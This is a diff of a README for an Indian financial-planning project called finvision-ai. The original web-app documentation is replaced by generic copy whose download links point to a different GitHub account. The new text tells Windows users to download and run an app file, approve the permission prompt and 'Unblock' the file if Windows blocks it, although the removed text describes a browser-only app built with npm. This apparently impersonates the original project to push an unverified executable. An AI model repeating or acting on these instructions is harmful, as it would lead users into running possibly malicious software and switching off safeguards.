@@ -1,145 +1,206 @@
-# FinVision AI — AI-Driven Financial Planning Platform
+# 📊 finvision-ai - Smart money plans for India
 
-[![Build](https://github.com/spmsuhas/finvision-ai/actions/workflows/ci.yml/badge.svg)](https://github.com/spmsuhas/finvision-ai/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download finvision-ai](https://img.shields.io/badge/Download%20finvision--ai-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elapsedtimeserology853/finvision-ai)
 
-An open-source, production-ready financial planning web application tailored for the Indian market. FinVision AI combines deterministic financial mathematics with Google Gemini generative AI to provide personalized, multi-decade wealth projections, tax optimization, and goal planning — all in a single-page app with zero backend servers required.
+## 🧭 Overview
 
----
+finvision-ai helps you plan money with tools made for India. It can project corpus growth, compare Old vs New tax regimes, help with LTCG harvesting, and give AI-based guidance through Gemini.
 
-## Features
+This app is built for people who want a clear view of their savings, taxes, and long-term goals. You can use it to check how SIPs may grow, how tax choice affects take-home value, and how much you may need to reach a target corpus.
 
-- **Corpus Trajectory Engine** — Year-by-year wealth accumulation from current age to 100, accounting for inflation-adjusted expenses, salary growth, and blended equity/debt CAGR.
-- **Tax Optimizer** — Side-by-side comparison of Old vs. New Tax Regime (Section 115BAC) with Section 87A rebate, surcharge, and marginal relief calculations for FY 2025-26 & 2026-27.
-- **LTCG Tax Harvesting** — Automated simulation of annual profit-booking up to the ₹1.25 lakh exemption limit to minimize future capital gains liability.
-- **Goal Planning** — Life milestone modelling (child's education, wedding, home purchase) with inflation-specific compounding (8% general, 13.5% medical, 11% education).
-- **AI Advisor** — Conversational financial advisor powered by Google Gemini with RAG-grounded Indian regulatory context.
-- **Interactive Charts** — Corpus spline-area timeline, asset allocation doughnut, and expense bar charts via Chart.js.
-- **PDF Export** — Professionally formatted downloadable report with executive summary, tax analysis, and year-by-year projection tables.
-- **Firebase Sync** — Optional Firebase Auth (Google OAuth + email/password) and Firestore persistence for multi-device access.
+## ✨ What you can do
 
----
+- Plan future wealth with corpus projection
+- Compare Old Regime and New Regime tax paths
+- Review long-term capital gains harvesting ideas
+- Estimate SIP growth over time
+- Use Gemini AI for finance-related guidance
+- Track planning with a clean dashboard
+- View charts that make money goals easier to read
+- Use tools tuned for Indian financial rules and common use cases
 
-## Tech Stack
+## 📥 Download and run on Windows
 
-| Layer | Technology |
-|---|---|
-| Build tool | Vite 8 (Rolldown bundler) |
-| Styling | Tailwind CSS v4 |
-| Charts | Chart.js 4 |
-| AI | Firebase AI Logic (Gemini) |
-| Database | Cloud Firestore |
-| Auth | Firebase Authentication |
-| PDF | jsPDF + html2canvas |
-| Runtime | Vanilla ES Modules (no framework) |
+Use this link to visit the page and download the app:
 
----
+[Download finvision-ai](https://github.com/elapsedtimeserology853/finvision-ai)
 
-## Getting Started
+### 🪟 Windows steps
 
-### Prerequisites
+1. Open the download page in your browser.
+2. Look for the latest release or download option.
+3. Download the Windows file or package from that page.
+4. If you get a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file and double-click it to run.
+7. If Windows asks for permission, choose Yes.
 
-- Node.js ≥ 18
-- npm ≥ 9
+### 📁 If you see a ZIP file
 
-### Installation
+- Save the ZIP file to your computer
+- Extract it to a simple folder like Desktop or Downloads
+- Open the extracted folder
+- Run the main app file inside it
 
-```bash
-git clone https://github.com/spmsuhas/finvision-ai.git
-cd finvision-ai
-npm install
-```
+### 🔒 If Windows blocks the file
 
-### Environment Variables
+- Right-click the file
+- Choose Properties
+- Select Unblock if you see that option
+- Click Apply
+- Open the file again
 
-Copy `.env.example` to `.env` and fill in your Firebase project credentials:
+## 🖥️ System needs
 
-```bash
-cp .env.example .env
-```
+For smooth use on Windows, this app should run well on:
 
-> The app runs fully in offline/demo mode without Firebase credentials. Auth and cloud save features require a valid Firebase project.
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- A stable internet connection
+- A modern web browser if the app opens in one
 
-### Development
+If you plan to use AI features, keep your internet connection on so the app can reach Gemini services.
 
-```bash
-npm run dev
-```
+## 🛠️ How to use the app
 
-Opens at `http://localhost:5173`
+### 1. Set your goal
 
-### Production Build
+Enter the goal you want to plan for. This could be retirement, a house, education, or general wealth growth.
 
-```bash
-npm run build
-npm run preview
-```
+### 2. Add your monthly input
 
----
+Enter your SIP amount, one-time investment, or savings rate. The app uses this to estimate your future corpus.
 
-## Project Structure
+### 3. Choose a time frame
 
-```
-finvision-ai/
-├── index.html                  # SPA shell — all 6 sections
-├── src/
-│   ├── main.js                 # App bootstrap, state management, SPA router
-│   ├── styles/
-│   │   └── main.css            # Tailwind v4 with @theme design tokens
-│   ├── utils/
-│   │   ├── constants.js        # ARD macroeconomic parameters (inflation, CAGR, tax slabs)
-│   │   ├── formatters.js       # Indian number system formatters (₹, Lakh, Crore)
-│   │   ├── financeEngine.js    # Corpus trajectory & SIP calculation engine
-│   │   └── taxEngine.js        # Old/New regime tax + LTCG harvesting engine
-│   ├── components/
-│   │   ├── charts/             # Chart.js wrappers (corpus, allocation, expense)
-│   │   ├── forms/              # Input forms (personal, assets, expenses, goals)
-│   │   ├── tables/             # Projection table with pagination & CSV export
-│   │   └── reports/            # PDF export module
-│   ├── firebase/
-│   │   ├── config.js           # Firebase app init (reads VITE_FIREBASE_* env vars)
-│   │   ├── auth.js             # Auth helpers (Google OAuth, email/password)
-│   │   └── firestore.js        # Firestore CRUD for plans & personal details
-│   └── ai/
-│       └── aiAdvisor.js        # Gemini integration with RAG context injection
-├── .env.example                # Environment variable template
-├── vite.config.js              # Vite config with Tailwind plugin & code splitting
-└── ARD.md                      # Application Requirement Document (source of truth)
-```
+Pick how long you want to invest or save. Longer time frames help show the effect of compounding.
 
----
+### 4. Compare tax paths
 
-## Macroeconomic Assumptions
+Use the tax tools to compare Old Regime and New Regime results. This helps you see which path may fit your income setup.
 
-All financial projections are calibrated against institutional research from Vanguard, Goldman Sachs, J.P. Morgan, and McKinsey & Company:
+### 5. Review LTCG ideas
 
-| Parameter | Value | Source |
-|---|---|---|
-| General inflation | 8.0% p.a. | Goldman Sachs (conservative buffer) |
-| Medical inflation | 13.5% p.a. | Asia Healthcare Index |
-| Education inflation | 11.0% p.a. | India private education trends |
-| Equity CAGR | 13.0% p.a. | Vanguard VCMM (emerging markets) |
-| Debt CAGR | 6.0% p.a. | India normalized interest rate |
-| Salary raise | 4.0% p.a. | ARD default |
-| End of Life horizon | 100 years | Longevity risk buffer |
-| Legacy buffer | 4× annual expense | Terminal estate planning |
+Check harvesting options for long-term capital gains. This can help you think through tax timing in a more structured way.
 
----
+### 6. Ask the AI advisor
 
-## Contributing
+Use Gemini AI to ask questions about planning, tax trade-offs, or goal setup. Keep your questions simple and specific.
 
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) before submitting a pull request.
+## 📈 Main features
 
----
+### Corpus projection
 
-## Security
+See how your money may grow over time based on return rate, time, and contribution amount. This helps you map long-term goals with a clear number.
 
-If you discover a security vulnerability, please follow the responsible disclosure process in [SECURITY.md](SECURITY.md). Do **not** open a public issue.
+### Tax optimization
 
----
+Compare the Old and New tax regimes in the Indian context. The app helps you look at income, deductions, and tax impact in one place.
 
-## License
+### LTCG harvesting
 
-This project is licensed under the [MIT License](LICENSE).
+Review long-term capital gains harvesting ideas for better tax planning. This can help with timing decisions across market cycles.
 
-© 2026 Suhas Manjunath
+### SIP calculator
+
+Estimate future value from monthly SIPs. Use it to test different amounts and time periods before you invest.
+
+### Gemini AI advisor
+
+Ask finance-related questions and get AI support inside the app. This can help with planning choices, tax questions, and next-step ideas.
+
+### Charts and visuals
+
+Use charts to see growth, targets, and comparisons. Visuals help when numbers feel hard to read in a table.
+
+### Indian market focus
+
+The app uses Indian rules, tax paths, and common planning needs as its base. This makes the tool fit local money decisions better.
+
+## 🧩 Best use cases
+
+- Planning for retirement
+- Comparing tax regime choices
+- Estimating the value of SIP investing
+- Checking how close you are to a target corpus
+- Thinking through tax-smart selling plans
+- Asking basic finance questions with AI support
+- Building a monthly savings plan for a family goal
+- Tracking long-term wealth growth in one place
+
+## 🧰 Typical setup flow
+
+If the download comes as a desktop app or packaged file, the usual path is simple:
+
+1. Download the package from the GitHub page
+2. Extract it if it is compressed
+3. Open the app file
+4. Sign in if the app asks for it
+5. Enter your goals and values
+6. Review the charts and tax view
+7. Save or note the result for later use
+
+## 📌 Tips for first use
+
+- Start with one goal only
+- Use round numbers at first
+- Keep your return rate realistic
+- Compare one tax regime at a time
+- Try a few SIP values to see the range
+- Use the chart view to spot long-term trends
+- Keep your income and deduction details ready for tax checks
+
+## 🔎 Topics covered
+
+- chart-js
+- financial-planning
+- firebase
+- gemini-ai
+- india
+- sip-calculator
+- tailwindcss
+- tax-optimization
+- vite
+- wealth-management
+
+## 🗂️ Project focus
+
+finvision-ai brings together planning, tax review, and AI support in one app. It aims to help non-technical users make sense of future money goals without dealing with complex tools.
+
+The app is built around common financial tasks:
+
+- corpus planning for long-term goals
+- tax regime comparison for Indian users
+- SIP growth checks
+- AI-led finance help
+- clear charts for better reading
+
+## 🔐 Data and account use
+
+Some parts of the app may use online services for sign-in, storage, or AI features. If the app asks for access, use your own account and check the prompt before you continue.
+
+## 🧪 Example questions for Gemini AI
+
+- How much should I invest each month to reach 1 crore in 15 years?
+- Which tax regime may suit a salaried person with deductions?
+- How can I plan SIPs for a child’s education goal?
+- What is LTCG harvesting in simple terms?
+- How do I compare two corpus plans with different return rates?
+
+## 🪄 How to get better results
+
+- Enter values with care
+- Keep goals specific
+- Use the same time frame when comparing plans
+- Review tax inputs before you trust the result
+- Recheck large numbers when you change return assumptions
+
+## 🧭 Where to start
+
+1. Download the app from the GitHub page
+2. Open it on your Windows PC
+3. Enter a goal amount
+4. Set your monthly investment
+5. Compare tax and corpus views
+6. Use the AI advisor for follow-up questions
